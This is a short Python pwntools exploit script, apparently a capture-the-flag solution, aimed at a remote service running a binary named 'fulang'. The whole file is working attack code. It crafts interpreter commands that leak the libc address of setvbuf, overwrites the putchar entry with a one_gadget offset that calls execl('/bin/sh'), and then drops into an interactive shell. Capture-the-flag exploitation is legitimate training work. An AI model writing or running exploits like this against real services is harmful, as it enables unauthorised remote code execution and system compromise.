from pwn import *
#io = process('./fulang')
io = remote('69.90.132.40',4001)
context.log_level = 'debug'
pause()
io.recvuntil(':')

payload = ''
payload += ':<' * 0x20 #g_fd = &g_fd
payload += ':.:::>:::>:::>::' #leak
payload += ':>:.:>:.:>:.:>' #overwrite putchar
payload += ':>:.' * 8 #input \x00
payload += ':<' * 7 #make g_fu point to \x00 which is the requirement of the one_gadget 
payload += '::' #trigger one_gadget
#payload += ':.' #for debug

print len(payload)
io.sendline(payload)
io.send('\x28')
setvbuf = u32(io.recvn(4))
log.info('setvbuf :' + hex(setvbuf))
l = ELF('./libc')
libc_main = setvbuf - l.symbols['setvbuf']

#1x5fbc6 execl("/bin/sh", [esp])
#constraints:
#  esi is the address of `rw-p` area of libc
#    [esp] == NULL
one = libc_main + 0x5fbc6 
log.info('one :' + hex(one)) 

io.send(chr(one & 0xff))
io.send(chr((one >> 8) & 0xff))
io.send(chr((one >> 16) & 0xff))

io.send('\x00' * 8)
io.interactive()
